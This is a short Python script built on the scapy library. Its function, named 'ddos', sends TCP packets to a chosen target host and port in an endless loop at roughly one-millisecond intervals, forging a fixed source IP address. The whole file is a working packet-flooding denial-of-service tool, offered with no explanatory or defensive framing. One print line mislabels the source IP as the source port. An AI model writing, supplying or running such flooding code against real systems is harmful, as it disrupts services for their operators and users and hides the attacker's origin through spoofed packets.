from scapy.all import *

src = '22.22.22.22'
source_port = 56666

def ddos(target, port):
    print(f'Source port: {src}')#
    print(f'target: {target}')#
    print(f'target port: {port}')#
    srcport = int(source_port)
    i=1
    while True:
        IP1 = IP(src=src, dst=target)
        TCP1 = TCP(sport=srcport, dport=port)
        pkt = IP1 / TCP1
        send(pkt,inter= .001)
        print(f"Packet(s) sent {i}")
        i=i+1
